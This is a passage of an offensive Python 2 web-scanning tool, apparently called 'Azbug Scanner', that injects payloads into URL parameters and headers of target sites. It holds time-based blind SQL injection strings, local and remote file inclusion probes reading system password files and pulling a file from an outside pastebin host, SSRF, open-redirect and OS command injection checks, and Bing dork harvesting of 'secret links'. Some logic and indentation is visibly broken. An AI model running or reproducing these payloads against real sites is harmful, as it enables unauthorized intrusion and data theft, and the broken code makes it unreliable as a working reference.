Chrome/19.0.1055.1 Safari/535.24","Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.15 (KHTML, like Gecko) Chrome/24.0.1295.0 Safari/537.15","Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36","Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36","Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36","Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36","Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0","Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5","Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3","Mozilla/5.0 (Windows; U; Windows NT 5.1; cs; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.36 Safari/525.19","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.53 Safari/525.19","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.173.1 Safari/530.5","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.223.3 Safari/532.2","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.600.0 Safari/534.14","Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.27 Safari/532.0","Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.558.0 Safari/534.10","Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.4 (KHTML, like Gecko) Chrome/6.0.481.0 Safari/534.4","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.540.0 Safari/534.10","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.0 Safari/534.13","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16","Mozilla/5.0 (Windows; Windows NT 6.1; rv:2.0b2) Gecko/20100720 Firefox/4.0b2","Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36","Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0","Mozilla/5.0 (X11; Linux i686 on x86_64; rv:12.0) Gecko/20100101 Firefox/12.0","Mozilla/5.0 (X11; Linux i686; rv:30.0) Gecko/20100101 Firefox/30.0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/63.0.3239.84 Chrome/63.0.3239.84 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64; rv:2.0b4) Gecko/20100818 Firefox/4.0b4","Mozilla/5.0 (X11; Linux x86_64; rv:2.0b9pre) Gecko/20110111 Firefox/4.0b9pre","Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0","Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0","Mozilla/5.0 (X11; U; Linux amd64; rv:5.0) Gecko/20100101 Firefox/5.0 (Debian)","Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2) Gecko/20100308 Ubuntu/10.04 (lucid) Firefox/3.6 GTB7.1","Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML,like Gecko) Chrome/9.1.0.0 Safari/540.0","Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.12) Gecko/20080214 Firefox/2.0.0.12","Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.8.0.5) Gecko/20060819 Firefox/1.5.0.5","Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.9b5) Gecko/2008032620 Firefox/3.0b5","Mozilla/5.0 (X11; U; Windows NT 6; en-US) AppleWebKit/534.12 (KHTML, like Gecko) Chrome/9.0.587.0 Safari/534.12","Mozilla/5.0 (X11; Ubuntu; Linux armv7l; rv:17.0) Gecko/20100101 Firefox/17.0","Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1","Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0","Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0;  Trident/5.0)","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)","Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)","Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)","Mozilla/5.0 (iPad; CPU OS 11_2_1 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C153 Safari/604.1"]
	userdz1 = {"User-Agent": random.choice(mylist)}
	link = str(domain + '/' + str(path))
	try:
		check = requests.get(link, headers=userdz1, allow_redirects=False, timeout=5)
		check2 = requests.get(link, headers=userdz1, allow_redirects=True, timeout=5)
		if check.status_code == 200:
			print('\033[1;93mStatus [ ' + '\033[1;92m' + str(check.status_code) + '\033[1;93m' +  ' ] \033[1;91m| ',  '\033[1;93mContent [  ' + '\033[1;92m'+ str(check.headers.get('Content-Length')) +'\033[1;93m'+ '  ]\033[1;96m' , link)
		elif (check.status_code == 301 or check.status_code == 302):
			print('\033[1;93mStatus [ ' + '\033[1;94m' + str(check.status_code) + '\033[1;93m' +  ' ] \033[1;91m| ',  '\033[1;93mContent [  ' + '\033[1;94m'+ str(check.headers.get('Content-Length')) +'\033[1;93m'+ '  ]\033[1;96m' , link, '     \033[1;91m-   \033[1;93mRedirect-URL: \033[1;95;40m' + check2.url + '\033[0m')
		elif check.status_code == 500:
			print('\033[1;93mStatus [ ' + '\033[1;95m' + str(check.status_code) + '\033[1;93m' +  ' ] \033[1;91m| ',  '\033[1;93mContent [  ' + '\033[1;95m'+ str(check.headers.get('Content-Length')) +'\033[1;93m'+ '  ]\033[1;96m' , link)
		else:
			print('\033[1;93mStatus [ ' + '\033[1;91m' + str(check.status_code) + '\033[1;93m' +' ] \033[1;91m| ' ,  '\033[1;93mContent [  ' + '\033[1;91m' + str(check.headers.get('Content-Length')) + '\033[1;93m' + '  ]\033[1;96m' , link)
	except:
		print("TimeOut / Or Error Host : " + link ,  end='																																								 								\r')
def ssrf(url):
	ssrf_url = "http://" + ssrf_urldz
	if "=" and "&" in url:
		papa = url + '&mami'
		end = re.findall("=(.*?)&", papa)
		for qwd5 in end:
			qwd5 = qwd5.rstrip()
			kaka45 = papa.replace("=" + qwd5 +"&", str("=" + ssrf_url + "&"))
			kaka45 = kaka45.replace('&mami', "")
			try:
				testy = requests.get(kaka45, cookies=cookies,verify=True, timeout=7)
			#######################################################################
				zebi = papa.replace(qwd5, str(ssrf_url))
				zebi = zebi.replace('&mami', "")
				zebi2 = requests.get(zebi, cookies=cookies,verify=True, timeout=7)
			##########################################################################
				if ssrf_url in testy.content:
					print('\033[1;93m*_* [ ' + '\033[1;92m' + "Always Check burp Collaborator Client" + '\033[1;93m' +  ' ] \033[1;96m ', kaka45)
				else:
					print('\033[1;93m*_* [ ' + '\033[1;92m' + "Always Check burp Collaborator Client" + '\033[1;93m' +  ' ] \033[1;96m ', zebi)
			except: # requests.exceptions.RequestException as sxaxwf:  # This is the correct syntax
				pass
	elif "=" in url and "&" not in url:
			papa = url + '#nemi'
			end = re.findall("=(.*?)#nemi", papa)
			for nono in end:
				nono = nono.rstrip()
				harami = papa.replace(nono, ssrf_url)
				harami = harami.replace("#nemi", "")
				try:
					kill3r = requests.get(harami, cookies=cookies, verify=True, timeout=7)
				#####################################################################"
					harami2 = papa.replace("#nemi", "")
					kill3r2 = requests.get(harami2, cookies=cookies, verify=True, timeout=7)
			##############################################################################""
					if ssrf_url in kill3r.content:
						print('\033[1;93m*_* [ ' + '\033[1;92m' + "Always Check burp Collaborator Client" + '\033[1;93m' +  ' ] \033[1;96m ', harami)
						#print('\033[1;92m[+]\033[1;93m'),  harami + ' \033[1;92m [SSRF Found]'
					else:
						print('\033[1;93m*_* [ ' + '\033[1;92m' + "Always Check burp Collaborator Client" + '\033[1;93m' +  ' ] \033[1;96m ', harami)
				except: #requests.exceptions.RequestException as sxaxw:  # This is the correct syntax
					pass
	else:
		print('\033[1;93mERROR [ ' + '\033[1;91m' + 'No Params For Scan SSRF' + '\033[1;93m' +  ' ] \033[1;96m ', url)

def lfinclution(url):
	try:
		if "=" and "&" in url:
			papa = url + '&mami'
			end = re.findall("=(.*?)&", papa)
			for qwd5 in end:
				qwd5 = qwd5.rstrip()
				for lfidz in lfi:
					lfidz = lfidz.rstrip()
					lfidz1 = papa.replace("="+qwd5+"&", "="+lfidz+"&")
					lfidz1 = lfidz1.replace('&mami', '')
					try:
						testy = requests.get(lfidz1, cookies=cookies,verify=True, timeout=5)
						if ('root:/bin/bash' or 'root:') in testy.content:
							print('\033[1;93mVuln Found [ ' + '\033[1;92m' + "Local File Inclution" + '\033[1;93m' +  ' ] \033[1;96m ', lfidz1)
							open('LFI.txt', 'a').write(lfidz1 + '\n')
						elif 'Attention Required! | Cloudflare' in testy.content:
							print('\033[1;93m[ ' + '\033[1;92m' + "Attention Required! | Cloudflare" + '\033[1;93m' +  ' ] \033[1;96m ', lfidz1)
						else:
							print('\033[1;93mVuln [ ' + '\033[1;91m' + 'NO LFI' + '\033[1;93m' +  ' ] \033[1;96m ', lfidz1)
					except:
						pass
				try:
					rfi = papa.replace(qwd5, 'https://pastebin.com/raw/0ZLA26XR')
					rfi = rfi.replace('&mami', '')
				###############################################
					zabir = requests.get(rfi, cookies=cookies,verify=True, timeout=5)
					if '8b85a0ab78a429ee3defcf1d14b6075a' in zabir.content:
						print('\033[1;93mVuln Found [ ' + '\033[1;92m' + "Remote File Inclution" + '\033[1;93m' +  ' ] \033[1;96m ', rfi)
						open('RFI.txt', 'a').write(rfi + '\n')
					else:
						print('\033[1;93mVuln [ ' + '\033[1;91m' + 'NO RFI' + '\033[1;93m' +  ' ] \033[1;96m ', rfi)
				except:
					pass
		elif "=" in url and "&" not in url:
			papa = url + '#nemi'
			end = re.findall("=(.*?)#nemi", papa)
			for qwd5 in end:
				qwd5 = qwd5.rstrip()
				for ninid in lfi:
					ninid = ninid.rstrip()
					ninid5 = papa.replace(qwd5, ninid)
					ninid5 = ninid5.replace('#nemi', '')
					try:
						testy = requests.get(ninid5, cookies=cookies,verify=True, timeout=5)
						if ('root:/bin/bash' or 'root:') in testy.content:
							print('\033[1;93mVuln Found [ ' + '\033[1;92m' + "Local File Inclution" + '\033[1;93m' +  ' ] \033[1;96m ', ninid5)
							open('LFI.txt', 'a').write(ninid5 + '\n')
						elif 'Attention Required! | Cloudflare' in testy.content:
							print('\033[1;93m[ ' + '\033[1;92m' + "Attention Required! | Cloudflare" + '\033[1;93m' +  ' ] \033[1;96m ', ninid5)
						else:
							print('\033[1;93mVuln [ ' + '\033[1;91m' + 'NO LFI' + '\033[1;93m' +  ' ] \033[1;96m ', ninid5)
					except:
						pass
				try:
	######################################################
					rfi2 = papa.replace(qwd5, 'https://pastebin.com/raw/0ZLA26XR')
					rfi2 = rfi2.replace('#nemi', '')
			##########################################################################""
					zabir2 = requests.get(rfi2, cookies=cookies,verify=True, timeout=5)
					if '8b85a0ab78a429ee3defcf1d14b6075a' in zabir2.content:
						print('\033[1;93mVuln Found [ ' + '\033[1;92m' + "Remote File Inclution" + '\033[1;93m' +  ' ] \033[1;96m ', rfi2)
						open('RFI.txt', 'a').write(rfi2 + '\n')
					else:
						print('\033[1;93mVuln [ ' + '\033[1;91m' + 'NO RFI' + '\033[1;93m' +  ' ] \033[1;96m ', rfi2)
				except:
					pass
		else:
			print('\033[1;93mERROR [ ' + '\033[1;91m' + 'No Params For Scan RFI AND LFI' + '\033[1;93m' +  ' ] \033[1;96m ', url)
	except requests.exceptions.RequestException as xvxw:  # This is the correct syntax
		print (xvxw)
		pass

def redirection(url):
	try:
		if "=" and "&" in url:
			papa = url + '&mami'
			end = re.findall("=(.*?)&", papa)
			for qwd5 in end:
				qwd5 = qwd5.rstrip()
				for nini in jsl:
					nini = nini.rstrip()
					kaka = papa.replace("=" + qwd5 + "&", "="+ nini+"&")
					kaka = kaka.replace('&mami', '')
					try:
						testy = requests.get(kaka, cookies=cookies,verify=True, timeout=5)
						#print(testy.content)
						if 'Evil.Com - We get it...Daily.' in testy.content:
							print('\033[1;93mVuln Found [ ' + '\033[1;92m' + "Open-ReDirect" + '\033[1;93m' +  ' ] \033[1;96m ', kaka)
							open('Open-ReDirect.txt', 'a').write(kaka + '\n')
						elif 'href="' + nini in testy.content:
							print('\033[1;92m[+]\033[1;93m',  kaka + ' \033[1;92m [Open-ReDirect]')
							open('Open-ReDirect.txt', 'a').write(kaka + '\n')
						elif 'href = "' + nini in testy.content:
							print('\033[1;92m[+]\033[1;93m',  kaka + ' \033[1;92m [Open-ReDirect]')
							open('Open-ReDirect.txt', 'a').write(kaka + '\n')
						elif 'src = "' + nini in testy.content:
							print('\033[1;92m[+]\033[1;93m',  kaka + ' \033[1;92m [Open-ReDirect]')
							open('Open-ReDirect.txt', 'a').write(kaka + '\n')
						elif 'src="' + nini in testy.content:
							print('\033[1;92m[+]\033[1;93m',  kaka + ' \033[1;92m [Open-ReDirect]')
							open('Open-ReDirect.txt', 'a').write(kaka + '\n')			
						else:
							print('\033[1;93mVuln [ ' + '\033[1;91m' + 'NO Open-ReDirect' + '\033[1;93m' +  ' ] \033[1;96m ', kaka)
					except:
						pass
		elif "=" in url and "&" not in url:
				papa = url + '#nemi'
				end = re.findall("=(.*?)#nemi", papa)
				for habibi in end:
					habibi = habibi.rstrip()
					for nini in jsl:
						nini = nini.rstrip()
						harami = papa.replace(habibi, nini)
						harami = harami.replace("#nemi", "")
						try:
							kill3r = requests.get(harami, cookies=cookies, verify=True, timeout=5)
							#print(kill3r.content)
							if 'Evil.Com - We get it...Daily.' in kill3r.content:
								print('\033[1;93mVuln Found [ ' + '\033[1;92m' + "Open-ReDirect" + '\033[1;93m' +  ' ] \033[1;96m ', harami)
								open('Open-ReDirect.txt', 'a').write(harami + '\n')
							elif 'href="' + nini in kill3r.content:
								print('\033[1;92m[+]\033[1;93m',  harami + ' \033[1;92m [Open-ReDirect]')
								open('Open-ReDirect.txt', 'a').write(harami + '\n')
							elif 'href = "' + nini in kill3r.content:
								print('\033[1;92m[+]\033[1;93m',  harami + ' \033[1;92m [Open-ReDirect]')
								open('Open-ReDirect.txt', 'a').write(harami + '\n')
							elif 'src = "' + nini in kill3r.content:
								print('\033[1;92m[+]\033[1;93m',  harami + ' \033[1;92m [Open-ReDirect]')
								open('Open-ReDirect.txt', 'a').write(harami + '\n')
							elif 'src="' + nini in kill3r.content:
								print('\033[1;92m[+]\033[1;93m',  harami + ' \033[1;92m [Open-ReDirect]')
								open('Open-ReDirect.txt', 'a').write(harami + '\n')			
							else:
								print('\033[1;93mVuln [ ' + '\033[1;91m' + 'NO Open-ReDirect' + '\033[1;93m' +  ' ] \033[1;96m ', harami)
						except:
							pass
		else:
			print('\033[1;93mERROR [ ' + '\033[1;91m' + 'No Params For Scan Redirection' + '\033[1;93m' +  ' ] \033[1;96m ', url)
	except requests.exceptions.RequestException as sxxw:  # This is the correct syntax
		print (sxxw)
		pass
def sql_useragent(url):
	sql_time = ["'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z","sleep(20)%23","1%20or%20sleep(20)%23",'"%20or%20sleep(20)%23',"'%20or%20sleep(20)%23",'"%20or%20sleep(20)%3d"',"'%20or%20sleep(20)%3d'","1)+or+sleep(20)%23",'")+or+sleep(20)%3d"',"')+or+sleep(20)%3d'","1))+or+sleep(20)%23",'"))+or+sleep(20)%3d"',"'))+or+sleep(20)%3d'","%3bwaitfor+delay+'0%3a0%3a5'--",")%3bwaitfor+delay+'0%3a0%3a5'--","'%3bwaitfor+delay+'0%3a0%3a5'--","')%3bwaitfor+delay+'0%3a0%3a5'--","1+or+pg_sleep(20)--",'"+or+pg_sleep(20)--',"'+or+pg_sleep(20)--","1)+or+pg_sleep(20)--",'")+or+pg_sleep(20)--',"')+or+pg_sleep(20)--","1))+or+pg_sleep(20)--",'"))+or+pg_sleep(20)--',"'))+or+pg_sleep(20)--","'+AnD+SLEEP(20)+ANd+'1","'%26%26SLEEP(20)%26%26'1","%2b+SLEEP(20)+%2b+'"]
	header_payload1 = ['User-Agent',"X-Forwarded-For","X-Forwarded-Host"]
	try:
		for header_payload in header_payload1:
			header_payload = header_payload.rstrip()
			for sql_test in sql_time:
				sql_test = sql_test.rstrip()
				sql_check = {header_payload:sql_test}
				
				dz1 = requests.get(url, headers=sql_check, cookies=cookies)

				if "0:00:2" in str(dz1.elapsed):
					#print(dz1)
					print('\033[1;92m* SQL_Blind [ ' + '\033[1;95m' + header_payload + '\033[1;93m' +  ' ] \033[1;91m| ',  '\033[1;92mPayload [  ' + '\033[1;95m'+ sql_test +'\033[1;93m'+ '  ]\033[1;92m' , url)
					open('SQL_blind.txt', 'a').write(url + " - " + str(sql_check) + '\n')
				else:
					print('\033[1;93mNO SQL [ ' + '\033[1;91m' + header_payload + '\033[1;93m' +  ' ] \033[1;91m| '+  '\033[1;93mPayload [  ' + '\033[1;91m'+ sql_test +'\033[1;93m'+ '  ]\033[1;96m', url)
	except:
		pass

def OS_Command(url):
	try:
		if "=" and "&" in url:
			papa = url + '&mami'
			end = re.findall("=(.*?)&", papa)
			for qwd5 in end:
				qwd5 = qwd5.rstrip()
				try:
					for nini in OS_Command1:
						nini = nini.rstrip()
						kaka = papa.replace("="+qwd5+"&", "="+nini+"&")
						kaka = kaka.replace('&mami', '')
						testy = requests.get(kaka, cookies=cookies,verify=True, timeout=5)
						if OS_Command1[nini] in testy.content:
							print('\033[1;93mVuln Found [ ' + '\033[1;92m' + "OS Command Injection" + '\033[1;93m' +  ' ] \033[1;96m ', kaka)
							open('OS_Command.txt', 'a').write(kaka + '\n')
						elif 'Attention Required! | Cloudflare' in testy.content:
							print('\033[1;93m[ ' + '\033[1;92m' + "Attention Required! | Cloudflare" + '\033[1;93m' +  ' ] \033[1;96m ', kaka)
						else:
							print('\033[1;93mVuln [ ' + '\033[1;91m' + 'NO OS Command Injection' + '\033[1;93m' +  ' ] \033[1;96m ', kaka)
				except requests.exceptions.RequestException as edgd:  # This is the correct syntax
					print (edgd)
					pass
		elif "=" in url and "&" not in url:
			papa = url + '#nemi'
			end = re.findall("=(.*?)#nemi", papa)
			for qwd5 in end:
				qwd5 = qwd5.rstrip()
				try:
					for nini in OS_Command1:
						nini = nini.rstrip()
						kaka = papa.replace(qwd5, nini)
						kaka = kaka.replace('#nemi', '')
						testy = requests.get(kaka, cookies=cookies,verify=True, timeout=5)
						if OS_Command1[nini] in testy.content:
							print('\033[1;93mVuln Found [ ' + '\033[1;92m' + "OS Command Injection" + '\033[1;93m' +  ' ] \033[1;96m ', kaka)
							open('OS_Command.txt', 'a').write(kaka + '\n')
						elif 'Attention Required! | Cloudflare' in testy.content:
							print('\033[1;93m[ ' + '\033[1;92m' + "Attention Required! | Cloudflare" + '\033[1;93m' +  ' ] \033[1;96m ', kaka)
						else:
							print('\033[1;93mVuln [ ' + '\033[1;91m' + 'NO OS Command Injection' + '\033[1;93m' +  ' ] \033[1;96m ', kaka)
				except requests.exceptions.RequestException as edgd11:  # This is the correct syntax
					print (edgd11)
					pass
		else:
			print('\033[1;93mERROR [ ' + '\033[1;91m' + 'No Params For Scan OS_Command' + '\033[1;93m' +  ' ] \033[1;96m ', url)
	except:
		pass
def bingerpro():
	user = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"}
	tnawet = []
	print("""

		\033[1;91m[1] \033[1;93m~~ \033[1;92mGet Subdomain From Bing With HOSTNAME
		\033[1;91m[2] \033[1;92m~~ \033[1;93mGrabb Secret Link By Dorks
		""")
	try:
		o = int(raw_input("\t\033[1;96m[?] Choose Section: "))
	except:
		print("\033[1;91m[-] Entre Number: +_* ")
	if o == 1:
		gr = raw_input("\t\033[1;96m[?] Entre HostName Ex:'host.com' ~: ")
		remo = []
		page = 1
		print("\033[1;96m[+] Wait Grabb Sites By HostName: ", gr)
		while page < 251:
			bing = "https://www.bing.com/search?q=site%3a"+gr+"&sp=-1&pq=site%3a&sc=8-4&qs=n&sk=&cvid=9A12AEEDCDEB4422AEF5541455ED2AA5&first="+str(page)+"&FORM=PERE"
			print("\033[1;94m* We Checking Page: \033[1;91m" + str(page) + "\033[1;94m !", end='                                                     \r')
			try:
				opene = requests.get(bing,headers=user,timeout=5)
				read = opene.content
				#findwebs = re.findall(r'<h2><a href=[\'"]?([^\'" >]+)', str(read))
				findwebs = re.findall('<h2><a href="(.*?)"', str(read))
				for i in findwebs:
					o = i.split('/')
					if (o[0]+'//'+o[2]) not in remo:
						remo.append(o[0]+'//'+o[2])
						print(o[0]+'//'+o[2])
						open('output/Sub_Binger.txt', 'a').write(o[0]+'//'+o[2] + '\n')
					else:
						pass
				page = page+5
			except:
				pass

	elif o == 2:
		tnawet = []
		try:
			Host = raw_input('\033[1;92m [ * ] Entre HostName Ex:host.com ~: ')
			gr = open('db/dorks.txt','r')
		except:
			print("no file name /db/dorks.txt")
			sys.exit()
		for done in gr:
		    remo = []
		    page = 1
		    print("\n\t$^_^$ \033[1;92mTarget: \033[1;96m" + Host + "\033[1;91m | \033[1;92mDork: \033[1;96m" + done)
		    while page < 251:
		    	print("\033[1;94m* We Checking Page: \033[1;91m" + str(page) + "\033[1;94m !", end='                                                     \r')
		    	bing = "http://www.bing.com/search?q=site%3a"+ Host +' '+ done + "&count=50&go=Search&qs=ds&first=" + str(page) +"&form=QBRE"
		        try:
			        opene = requests.get(bing,headers=user,timeout=5)
			        read = opene.content
			        findwebs = re.findall(r'<h2><a href=[\'"]?([^\'" >]+)', str(read))
	        		for dz9 in findwebs:
	        			mp = dz9
        				if mp not in tnawet:
        					tnawet.append(mp)
        					print("\033[1;95m[XxX] \033[1;92m" + mp)
        					open('output/UrlsBy_Dorks.txt', 'a').write(mp + '\n')
        				else:
        					pass
	        		page = page+5
		        except:
		        	pass


   	else:
		print("\033[1;91m[-] Entre Number Please :(")

def status_checker(url):
	if url[:8] == "https://":
		url = url.replace("https://", "")
	if url[:7] != "http://":
		url = "http://" + url
	try:
		check = requests.get(url, allow_redirects=False, timeout=3)
		if check.status_code <= 302:
			print('\033[1;93mStatus [ ' + '\033[1;92m' + str(check.status_code) + '\033[1;93m' +  ' ] \033[1;91m| ',  '\033[1;93mContent [  ' + '\033[1;92m'+ str(check.headers.get('Content-Length')) +'\033[1;93m'+ '  ]\033[1;96m' ,url)
			with open('output/200_OK.txt','a') as sdz:
				sdz.writelines(url + '\n')
		else:	
			print('\033[1;93mStatus [ ' + '\033[1;91m' + str(check.status_code) + '\033[1;93m' +' ] \033[1;91m| ',  '\033[1;91mContent [  ' + '\033[1;93m' + str(check.headers.get('Content-Length')) + '\033[1;94m' + '  ]\033[1;91m', url)
	except:
		print('\033[1;93mStatus [ ' + '\033[1;91m' + 'ERROR' + '\033[1;93m' +' ] \033[1;91m| ',  '\033[1;91mContent [  ' + '\033[1;93m' + 'ERROR' + '\033[1;94m' + '  ]\033[1;91m', url)

def subfinder():
	dzdz = "https://api.hackertarget.com/hostsearch/?q="
	kok = raw_input("\n\033[1;96m\t [+] Entre Your Domain Without [HTTP://]: ")
	if kok[:7] == "http://":
		kok = kok.replace("http://","")
	if kok[:8] == "https://":
		kok = kok.replace("https://", "")
	if kok[-1] == "/":
		kok = kok.replace("/","")
	opendz = requests.get(dzdz + kok).content
	dz12 = re.findall('(.+?),', opendz)
	for i3 in dz12:
		i3 = i3.rstrip()
		print("\033[1;92mhttp://" + i3)
		with open('output/Sub_Found1.txt','a') as sdz:
			sdz.writelines(i3 + '\n')

def clearscrn():
	if system() == 'Linux':
		os.system('clear')
	if system() == 'Windows':
		os.system('cls')
		os.system('color a')


def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(2. / 100)
def about():	
	print("""
				\033[1;93m##############\033[1;91m#######################
				\033[1;92m#				    #	
				\033[1;93m#	     \033[1;96mDisclaimer	  	    #
				\033[1;94m#				    #
				\033[1;91m###############\033[1;93m######################
				 \033[1;95mThis Script Work Only With Python 2		
			\033[5;92mWe Are Not Responsible For Any Kind Of Bad Activities.\033[0;91m
		  \033[1;93mIF You Have Any Probleme About Script Contact Me: twitter.com/Kil3rdz
				       \033[1;96mThanx To All My Friends

		""")

def print_logo():
	print(b'\33]0;Powered By Trojan Kil3r Amazigh | Kabyle Hacker | Algeria Hacker |\a')


	xx = """
\033[1;91m	
		 █████╗ ███████╗██████╗ ██╗   ██╗ ██████╗     ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ \033[1;92m
		██╔══██╗╚══███╔╝██╔══██╗██║   ██║██╔════╝     ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗\033[1;93m
		███████║  ███╔╝ ██████╔╝██║   ██║██║  ███╗    ███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝\033[1;94m
		██╔══██║ ███╔╝  ██╔══██╗██║   ██║██║   ██║    ╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗\033[1;96m
		██║  ██║███████╗██████╔╝╚██████╔╝╚██████╔╝    ███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║\033[1;95m
		╚═╝  ╚═╝╚══════╝╚═════╝  ╚═════╝  ╚═════╝     ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝\033[1;95m
	
	\033[1;93m                                                                                                          
					🔰 Script Name : \033[1;91m| \033[1;92mA\033[1;93mu\033[1;96mt\033[1;95mo\033[1;96mm\033[1;91ma\033[1;92mt\033[1;93mi\033[1;96mo\033[1;95mn\033[1;94m_Scr\033[1;93mipt\033[1;92m |  \033[1;93m👻\033[1;96m
	                	Greetz To : \033[1;93mNo\033[0;92m\033[1;92m_One  \033[5;91m|D\033[5;92mz| \033[0;96m\033[1;96mResearcher \033[94mDz\033[90m \033[93m
	"""
	

	x = """

\033[91m
	   	
	  ___      _                    _____                                 \033[1;92m
	 / _ \    | |                  /  ___|                                \033[1;93m
	/ /_\ \___| |__  _   _  __ _   \ `--.  ___ __ _ _ __  _ __   ___ _ __ \033[1;94m
	|  _  |_  / '_ \| | | |/ _` |   `--. \/ __/ _` | '_ \| '_ \ / _ \ '__|\033[1;92m
	| | | |/ /| |_) | |_| | (_| |  /\__/ / (_| (_| | | | | | | |  __/ |   \033[1;96m
	\_| |_/___|_.__/ \__,_|\__, |  \____/ \___\__,_|_| |_|_| |_|\___|_|   \033[1;93m
	                        __/ |                                        \033[1;92m
	                       |___/                                         \033[1;94m

	\033[1;93m                                                                                                          
					🔰 Script Name : \033[1;91m| \033[1;92mA\033[1;93mu\033[1;96mt\033[1;95mo\033[1;96mm\033[1;91ma\033[1;92mt\033[1;93mi\033[1;96mo\033[1;95mn\033[1;94m_Scr\033[1;93mipt\033[1;92m |  \033[1;93m👻\033[1;96m
	                	Greetz To : \033[1;93mNo\033[0;92m\033[1;92m_One  \033[5;91m|D\033[5;92mz| \033[0;96m\033[1;96mResearcher \033[94mDz\033[90m \033[93m
	"""
	if system() == 'Windows':
		print(x)
